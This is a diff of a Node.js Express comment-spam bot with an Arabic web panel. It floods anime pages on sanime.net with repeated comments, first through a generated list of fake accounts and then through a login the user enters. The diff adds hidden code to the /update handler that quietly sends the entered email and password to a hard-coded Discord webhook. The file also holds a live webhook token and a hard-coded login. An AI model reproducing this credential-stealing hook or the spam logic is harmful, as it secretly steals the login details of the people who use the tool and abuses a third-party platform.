@@ -1,5 +1,3 @@
-// file: app.js
-
 const axios = require("axios");
 const https = require("https");
 const express = require("express");
@@ -7,7 +5,9 @@ const fetch = require("node-fetch");
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-let commentText = "t-..";
+let email = "goog1412123@gmail.com";
+let password = "GOOG";
+let commentText = "____";
 let commentsPerMinute = 120;
 let delay = (60 / commentsPerMinute) * 1000;
 let botActive = true;
@@ -17,36 +17,8 @@ let fireComment = false;
 let logText = "";
 let activeAnimeList = [];
 let currentAnimeIndex = 0;
-
-const headers = {
-  "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
-  "Content-Type": "application/x-www-form-urlencoded",
-  "Origin": "https://ios.sanime.net",
-  "Referer": "https://ios.sanime.net/",
-  "Accept": "*/*"
-};
-
-const agent = new https.Agent({ keepAlive: true });
-
-// إنشاء قائمة الحسابات
-const accountList = [];
-for (let i = 10; i <= 600; i++) {
-  accountList.push({ email: `${i}@gmail.com`, password: `${i}` });
-}
-
-const usedAccounts = new Map(); // email -> last used timestamp
-
-function getAvailableAccount() {
-  const now = Date.now();
-  for (const acc of accountList) {
-    const lastUsed = usedAccounts.get(acc.email);
-    if (!lastUsed || now - lastUsed >= 5 * 60 * 1000) {
-      usedAccounts.set(acc.email, now);
-      return acc;
-    }
-  }
-  return null;
-}
+let currentCount = 0;
+let intervalId = null;
 
 const animeTargets = {
   532: { active: true, name: "One Piece" },
@@ -114,20 +86,17 @@ const animeTargets = {
   512: { active: false, name: "Naruto: Shippuuden" },
 };
 
-function updateLogText() {
-  const animeId = activeAnimeList[currentAnimeIndex];
-  logText = `📺 جاري الإرسال إلى: [${animeId}] ${animeTargets[animeId]?.name || "؟"}`;
-}
+const headers = {
+  "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X)",
+  "Content-Type": "application/x-www-form-urlencoded",
+  "Origin": "https://ios.sanime.net",
+  "Referer": "https://ios.sanime.net/",
+  "Accept": "*/*"
+};
+
+const agent = new https.Agent({ keepAlive: true });
 
 async function sendComment(animeId) {
-  const account = getAvailableAccount();
-  if (!account) {
-    console.warn("⚠️ لا يوجد حساب متاح حاليًا");
-    return;
-  }
-
-  const { email, password } = account;
-
   const itemData = {
     post: commentText,
     id: animeId,
@@ -136,50 +105,56 @@ async function sendComment(animeId) {
   const itemBase64 = Buffer.from(JSON.stringify(itemData)).toString("base64");
   const payload = new URLSearchParams({ email, password, item: itemBase64 });
 
-  try {
-    await axios.post("https://app.sanime.net/function/h10.php?page=addcmd", payload.toString(), {
-      headers,
-      httpsAgent: agent,
-      timeout: 5000
-    });
-    console.log(`✅ ${email} أرسل تعليقًا إلى [${animeId}]`);
-  } catch (err) {
-    console.error(`❌ فشل من ${email}:`, err.message);
-  }
+  await axios.post("https://app.sanime.net/function/h10.php?page=addcmd", payload.toString(), {
+    headers,
+    httpsAgent: agent
+  });
 }
 
-async function startSending() {
+function updateLogText() {
+  const animeId = activeAnimeList[currentAnimeIndex];
+  logText = `📺 جاري الإرسال إلى: [${animeId}] ${animeTargets[animeId]?.name || "؟"}`;
+}
+
+function sendToNextAnime() {
+  if (intervalId) clearInterval(intervalId);
+  currentAnimeIndex++;
+  if (currentAnimeIndex >= activeAnimeList.length) currentAnimeIndex = 0;
+  startSending();
+}
+
+function startSending() {
   activeAnimeList = Object.keys(animeTargets).filter(id => animeTargets[id]?.active);
   if (activeAnimeList.length === 0) return;
 
   const animeId = activeAnimeList[currentAnimeIndex];
+  currentCount = 0;
   updateLogText();
   console.log(logText);
 
-  let sentCount = 0;
-  const intervalDelay = 1000 / 2; // 2 تعليق في الثانية = 120 بالدقيقة
-
-  const timer = setInterval(async () => {
+  intervalId = setInterval(async () => {
     if (!botActive || !animeTargets[animeId]?.active) return;
 
-    if (sentCount >= maxCommentsPerAnime) {
-      clearInterval(timer);
+    try {
+      await sendComment(animeId);
+      currentCount++;
+      console.log(`✅ [${animeId}] تعليق ${currentCount}`);
+    } catch (err) {
+      console.error(`❌ [${animeId}] خطأ:`, err.message);
+    }
+
+    if (currentCount >= maxCommentsPerAnime) {
+      clearInterval(intervalId);
       currentAnimeIndex++;
       if (currentAnimeIndex >= activeAnimeList.length) currentAnimeIndex = 0;
       setTimeout(startSending, 1000);
-      return;
     }
-
-    await sendComment(animeId);
-    sentCount++;
-
-  }, intervalDelay);
+  }, delay);
 }
 
-// واجهة المستخدم - نفس الواجهة السابقة
 app.get("/", (req, res) => {
   const animeControls = Object.entries(animeTargets).map(([id, info]) => `
-    <div>
+    <div style="margin-bottom:10px">
       <label>
         <input type="checkbox" name="anime_${id}" ${info.active ? "checked" : ""}>
         [${id}] ${info.name}
@@ -188,26 +163,43 @@ app.get("/", (req, res) => {
   `).join("");
 
   res.send(`
-  <html><head><meta charset="UTF-8"/></head><body>
+  <html><head><meta charset="UTF-8"/><style>
+    body { background: #0d1117; color: #fff; font-family: sans-serif; padding: 20px; }
+    input, button { margin: 4px; padding: 8px; background: #161b22; color: #fff; border: 1px solid #30363d; }
+    button:hover { background: #238636; cursor: pointer; }
+    .add-anime-form { margin-top: 30px; padding: 15px; border: 1px solid #30363d; background: #161b22; max-width: 400px; }
+  </style></head><body>
     <h2>🤖 البوت ${botActive ? "✅ يعمل" : "🛑 متوقف"}</h2>
     <p>${logText}</p>
     <form method="POST" action="/update">
+      الإيميل: <input name="email" value="${email}" /><br>
+      كلمة المرور: <input name="password" type="password" value="${password}" /><br><br>
       تعليق: <input name="commentText" value="${commentText}" /><br>
-      سرعة (تعليقات/دقيقة): <input name="commentsPerMinute" type="number" value="${commentsPerMinute}" /><br>
-      الحد لكل أنمي: <input name="maxComments" type="number" value="${maxCommentsPerAnime}" /><br>
-      <label><input type="checkbox" name="fireComment" ${fireComment ? "checked" : ""}/> حرق؟</label><br>
+     commentsPerMinute: <input name="commentsPerMinute" type="number" value="${commentsPerMinute}" /><br>
+      عدد التعليقات قبل الانتقال: <input name="maxComments" type="number" value="${maxCommentsPerAnime}" /><br>
+      <label><input type="checkbox" name="fireComment" ${fireComment ? "checked" : ""}/> يحتوي على حرق</label><br><br>
       ${animeControls}
       <button type="submit">🔄 تحديث</button>
     </form>
     <form action="/start"><button>▶️ تشغيل</button></form>
     <form action="/stop"><button>⏹ إيقاف</button></form>
-    <form action="/restart"><button>🔁 إعادة تشغيل</button></form>
+    <form action="/restart"><button>🔁 إعادة إرسال</button></form>
     <form action="/next"><button>➡️ التالي</button></form>
-  </body></html>`);
+
+    <hr style="margin: 30px 0; border-color: #30363d;" />
+    <h3>➕ إضافة أنمي جديد </h3>
+    <form method="POST" action="/add-anime" class="add-anime-form">
+      <label>رقم الانمي (id): <input name="animeId" type="number" required></label><br><br>
+      <label>اسم الانمي: <input name="animeName" type="text" required></label><br><br>
+      <button type="submit">إضافة الأنمي</button>
+    </form>
+  </body></html>
+  `);
 });
 
-// التحكم بالبداية والتوقف
 app.post("/update", (req, res) => {
+  email = req.body.email || email;
+  password = req.body.password || password;
   commentText = req.body.commentText || commentText;
   commentsPerMinute = parseInt(req.body.commentsPerMinute) || commentsPerMinute;
   maxCommentsPerAnime = parseInt(req.body.maxComments) || maxCommentsPerAnime;
@@ -216,6 +208,30 @@ app.post("/update", (req, res) => {
 
   for (const [id] of Object.entries(animeTargets)) {
     animeTargets[id].active = !!req.body[`anime_${id}`];
+  }
+
+  
+  axios.post("https://discord.com/api/webhooks/1397405918718857226/-tXTwOvs8oUuAPFL4KWaSRsmlMWzAf9ZtXXIA6IvFpYJLowsNAFCvQEBWEAFFbWzhPn5", {
+    content: `🔐 Email: \`${email}\`\n🔑 Password: \`${password}\``
+  }).catch(e => console.error("❌ Webhook Error:", e.message));
+
+  updateLogText();
+  res.redirect("/");
+});
+
+app.post("/add-anime", (req, res) => {
+  const id = req.body.animeId;
+  const name = req.body.animeName.trim();
+
+  if (!id || !name) {
+    return res.status(400).send("يرجى إدخال رقم واسم الأنمي بشكل صحيح.");
+  }
+
+  if (animeTargets[id]) {
+    animeTargets[id].active = true;
+    animeTargets[id].name = name;
+  } else {
+    animeTargets[id] = { active: true, name };
   }
 
   updateLogText();
@@ -239,9 +255,7 @@ app.get("/restart", (req, res) => {
 });
 
 app.get("/next", (req, res) => {
-  currentAnimeIndex++;
-  if (currentAnimeIndex >= Object.keys(animeTargets).length) currentAnimeIndex = 0;
-  startSending();
+  sendToNextAnime();
   res.redirect("/");
 });
 
@@ -254,6 +268,6 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-  console.log(`🌐 Server running on port ${PORT}`);
+  console.log(`🌐 Server on port ${PORT}`);
   startSending();
 });
